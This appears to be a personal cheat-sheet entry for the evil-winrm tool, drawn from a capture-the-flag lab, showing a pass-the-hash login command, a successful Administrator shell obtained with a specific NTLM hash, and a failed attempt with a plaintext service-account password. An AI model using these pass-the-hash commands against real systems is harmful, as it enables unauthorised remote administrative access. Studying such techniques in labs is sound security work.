# evil-winrm
## Examples
### Login to user using NTLM Hash
```
evil-winrm  -i $IP -u $USER -H $NTLM_HASH
```
#### Examples
##### Success
```
┌──(kali㉿kali)-[~/Documents/attacktive-directory]
└─$ evil-winrm -i $IP -u Administrator -H 0e0363213e37b94221497260b0bcb4fc                                             1 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                               

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

##### Failure
```
┌──(kali㉿kali)-[~/Documents/attacktive-directory]
└─$ evil-winrm -i $IP -u svc-admin -p management2005

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                               

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

                                                                                                                           
┌──(kali㉿kali)-[~/Documents/attacktive-directory]
└─$
```